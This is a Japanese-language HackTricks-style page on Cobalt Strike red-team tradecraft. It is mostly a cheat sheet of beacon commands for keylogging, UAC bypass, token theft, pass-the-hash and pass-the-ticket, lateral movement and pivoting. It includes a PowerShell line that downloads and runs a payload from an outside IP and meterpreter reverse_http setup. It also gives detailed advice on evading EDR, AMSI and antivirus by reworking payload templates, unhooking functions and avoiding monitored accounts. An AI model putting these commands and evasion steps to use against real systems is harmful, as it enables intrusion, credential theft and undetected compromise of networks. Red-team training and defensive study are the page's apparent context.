# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` から、リッスンする場所、使用する beacon の種類（http、dns、smb など）などを選択できます。

### Peer2Peer Listeners

これらのリスナーの beacon は C2 と直接通信する必要はなく、他の beacon を介して通信できます。

`Cobalt Strike -> Listeners -> Add/Edit` から、TCP beacon または SMB beacon を選択します。

* **TCP beacon は、選択したポートにリスナーを設定します**。TCP beacon に接続するには、別の beacon から `connect <ip> <port>` コマンドを使用します。
* **smb beacon は、選択した名前の pipename でリッスンします**。SMB beacon に接続するには、`link [target] [pipe]` コマンドを使用します。

### payload の生成とホスト

#### ファイルとして payload を生成

`Attacks -> Packages ->`

* HTA ファイルには **`HTMLApplication`**
* macro を含む office ドキュメントには **`MS Office Macro`**
* .exe、.dll、または service .exe には **`Windows Executable`**
* **stageless** な .exe、.dll、または service .exe には **`Windows Executable (S)`**（staged よりも stageless の方が IoC が少なく優れています）

#### payload の生成とホスト

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` では、bitsadmin、exe、powershell、python などの形式で、Cobalt Strike から beacon をダウンロードする script/executable が生成されます。

#### payload のホスト

すでに web server でホストしたいファイルがある場合は、`Attacks -> Web Drive-by -> Host File` に移動し、ホストするファイルと web server の設定を選択します。

### Beacon Options

<details>
<summary>Beacon options and commands</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- カスタム agent は、登録/check-in とタスクの受信に Cobalt Strike Team Server の HTTP/S protocol（デフォルトの malleable C2 profile）を話せればよい。profile で定義された同じ URI/headers/metadata crypto を実装することで、タスクの割り当てと出力に Cobalt Strike UI を再利用できる。<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Aggressor Script（例: `CustomBeacon.cna`）で non-Windows beacon の payload 生成をラップすれば、operator は listener を選択し、GUI から直接 ELF payloads を生成できる。
- Team Server に公開する Linux task handlers の例: `sleep`、`cd`、`pwd`、`shell`（任意の commands を実行）、`ls`、`upload`、`download`、`exit`。これらは Team Server が想定する task IDs に対応しており、適切な形式で output を返すよう server-side で実装する必要がある。
- Linux での BOF support は、[TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader)（Outflank-style BOFs も support）を使用して Beacon Object Files を in-process で load することで追加できる。これにより、新しい processes を spawn せず、implant の context/privileges 内で modular post-exploitation を実行できる。<sup>[[2]](#references)[[3]](#references)</sup>
- custom beacon に SOCKS handler を組み込み、Windows Beacons との pivoting parity を維持する。operator が `socks <port>` を実行すると、implant は local proxy を開き、侵害した Linux host を経由して operator tooling を internal networks に route する。

## Opsec

### Execute-Assembly

**`execute-assembly`** は、remote process injection を使用する **sacrificial process** で指定された program を実行する。process に inject するには、すべての EDR が check している特定の Win APIs が使用されるため、非常に noisy である。ただし、同じ process 内に何かを load するために使用できる custom tools がいくつかある。

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Cobalt Strike では BOF (Beacon Object Files) も使用できる: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

agressor script `https://github.com/outflanknl/HelpColor` は Cobalt Strike に `helpx` command を作成する。この command は、commands が BOFs（green）、Frok&Run（yellow）などであるか、ProcessExecution、injection など（red）であるかを示す colors を付ける。これにより、どの commands がより stealthy かを把握しやすくなる。

### Act as the user

`Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` のような events を check できる。

- Security EID 4624 - 通常の operating hours を把握するため、すべての interactive logons を check する。
- System EID 12,13 - shutdown/startup/sleep の frequency を check する。
- Security EID 4624/4625 - inbound の valid/invalid NTLM attempts を check する。
- Security EID 4648 - plaintext credentials が logon に使用されたときに、この event が作成される。process がこれを生成した場合、その binary は config file 内または code 内に credentials を clear text で保持している可能性がある。

Cobalt Strike で `jump` を使用するときは、new process をより legit に見せるため、`wmi_msbuild` method を使用する方がよい。

### Use computer accounts

defenders が users によって生成された weird behaviours を check し、**service accounts と `*$` のような computer accounts を monitoring から除外する**のは common である。これらの accounts を lateral movement または privilege escalation に使用できる。

### Use stageless payloads

Stageless payloads は、C2 server から second stage を download する必要がないため、staged ones よりも noisy ではない。つまり、initial connection の後に network traffic を生成しないため、network-based defenses に detect される可能性が低くなる。

### Tokens & Token Store

tokens を steal または generate するときは注意すること。EDR は thread tokens を enumerate し、process 内に存在する **different user に属する token**、または SYSTEM token さえ detect する可能性がある。

これにより tokens を **per beacon** で store できるため、同じ token を何度も steal する必要がなくなる。これは lateral movement や、stolen token を複数回使用する必要がある場合に有用である。

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

lateral movement を行う場合、通常は **新しい token を generate したり pass the hash attack を実行したりするより、token を steal する**方がよい。

### Guardrails

Cobalt Strike には **Guardrails** という feature があり、defenders に detect される可能性のある特定の commands や actions の使用を防止できる。Guardrails は、lateral movement や privilege escalation に commonly 使用される `make_token`、`jump`、`remote-exec` などの specific commands を block するよう設定できる。

さらに、repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) には、payload を execute する前に検討できる checks と ideas も含まれている。

### Tickets encryption

AD では tickets の encryption に注意すること。デフォルトでは、一部の tools が Kerberos tickets に RC4 encryption を使用するが、これは AES encryption より secure ではなく、up to date environments ではデフォルトで AES が使用される。これは weak encryption algorithms を monitoring している defenders に detect される可能性がある。

### Avoid Defaults

Cobalt Stricke を使用すると、デフォルトで SMB pipes の名前は `msagent_####` と `"status_####"` になる。これらの名前を変更すること。Cobal Strike では、command `ls \\.\pipe\` により existing pipes の names を check できる。

さらに、SSH sessions では `\\.\pipe\postex_ssh_####` という pipe が作成される。`set ssh_pipename "<new_name>";` で変更すること。

また、poext exploitation attack では、pipes `\\.\pipe\postex_####` を `set pipename "<new_name>"` で変更できる。

Cobalt Strike profiles では、次のようなものも変更できる。

- `rwx` の使用を回避する
- process injection behavior の動作（どの APIs を使用するか）を `process-inject {...}` block で指定する
- `post-ex {…}` block で "fork and run" の動作を指定する
- sleep time
- memory に load する binaries の max size
- `stage {...}` block による memory footprint と DLL content
- network traffic

### Bypass memory scanning

一部の ERDs は、既知の malware signatures を memory 内で scan する。Coblat Strike では、`sleep_mask` function を BOF として変更し、memory 内の bacldoor を encrypt できる。

### Noisy proc injections

process に code を inject すると、通常は非常に noisy になる。これは、**通常の process はこの action を実行せず、これを行う方法も非常に限られている**ためである。そのため、behaviour-based detection systems に detect される可能性がある。さらに、EDRs が network を scan して、**disk 上に存在しない code を含む threads** を検出することもある（ただし、JIT を使用する browsers などの processes では一般的である）。Example: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

new process を spawn するときは、detect を避けるため、process 間の **regular parent-child** relationship を維持することが重要である。svchost.exec が iexplorer.exe を execute している場合、通常の Windows environment では svchost.exe は iexplorer.exe の parent ではないため、suspicious に見える。

Cobalt Strike で new beacon を spawn すると、デフォルトでは **`rundll32.exe`** を使用する process が作成され、新しい listener を実行する。これはあまり stealthy ではなく、EDRs に容易に detect される。さらに、`rundll32.exe` は args なしで実行されるため、より suspicious になる。

次の Cobalt Strike command を使用すると、new beacon を spawn する別の process を指定でき、detect されにくくなる。
```bash
spawnto x86 svchost.exe
```
You can also change this setting **`spawnto_x86` and `spawnto_x64`** in a profile.

### Attackers の traffic を Proxying

Attackers は、Linux マシン上であっても tools をローカルで実行し、その traffic が victims の環境から tool に到達できるようにする必要がある場合があります（例: NTLM relay）。

さらに、pass-the.hash や pass-the-ticket attack を行う場合、attacker がこの hash や ticket を自身の LSASS process にローカルで **追加** し、そこから pivot するほうが、victim machine の LSASS process を変更するより stealthy なことがあります。

ただし、**生成される traffic には注意** が必要です。backdoor process から uncommon な traffic（kerberos?）を送信することになる可能性があるためです。この場合、browser process に pivot できます（ただし、自分自身を process に injecting しているところを検知される可能性があるため、これを行う stealthy な方法を検討してください）。


### AVs の回避

#### AV/AMSI/ETW Bypass

次のページを確認してください:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

通常、`/opt/cobaltstrike/artifact-kit` には、cobalt strike が binary beacons を生成するために使用する payloads の code と pre-compiled templates（`/src-common` 内）があります。

生成した backdoor（または compiled template のみ）に [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) を使用すると、何が defender を trigger させているのかを特定できます。通常、それは string です。そのため、最終的な binary にその string が出現しないよう、backdoor を生成している code を変更します。

code を変更したら、同じ directory から `./build.sh` を実行し、`dist-pipe/` folder を Windows client の `C:\Tools\cobaltstrike\ArtifactKit` に copy します。
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
攻撃的なスクリプト `dist-pipe\artifact.cna` を忘れずにロードして、Cobalt Strike に、ロード済みのリソースではなく、指定したディスク上のリソースを使用させます。

#### リソースキット

ResourceKit フォルダーには、PowerShell、VBA、HTA など、Cobalt Strike のスクリプトベースの payloads 用テンプレートが含まれています。

テンプレートと [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) を使用すると、Defender（この場合は AMSI）が何を問題視しているのかを特定し、それを変更できます。
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
検出された行を変更することで、検知されないテンプレートを生成できます。

攻撃的なスクリプト `ResourceKit\resources.cna` をロードすることを忘れないでください。これにより、Cobalt Strike に対して、ロード済みのリソースではなく、使用したいディスク上のリソースを使用するよう指示できます。

#### Function hooks | Syscall

Function hooking は、悪意のあるアクティビティを検出するための ERDs の非常に一般的な手法です。Cobalt Strike では、標準の Windows API calls の代わりに **syscalls** を使用することで、これらの hooks を bypass できます。これは **`None`** config で実行できます。また、malleable profile の **`Direct`** setting を使用して関数の `Nt*` version を使用するか、**`Indirect`** option を使用して `Nt*` function を単に飛び越すこともできます。システムによっては、一方の option のほうが他方より stealthy な場合があります。

これは profile または **`syscall-method`** command で設定できます。

ただし、これも noisy になる可能性があります。

Cobalt Strike が function hooks を bypass するために提供している方法の 1 つは、[**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof) を使用して hooks を削除することです。

[**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) または [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector) を使用して、どの functions に hooks が設定されているかを確認することもできます。




<details>
<summary>Cobalt Strike の Misc commands</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## References

- [1] [Cobalt Strike Linux Beacon（custom implant PoC）](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader と Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [4] [Cobalt Strike metadata encryption に関する Unit42 の分析](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Cobalt Strike traffic に関する SANS ISC の diary](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
{{#include ../banners/hacktricks-training.md}}
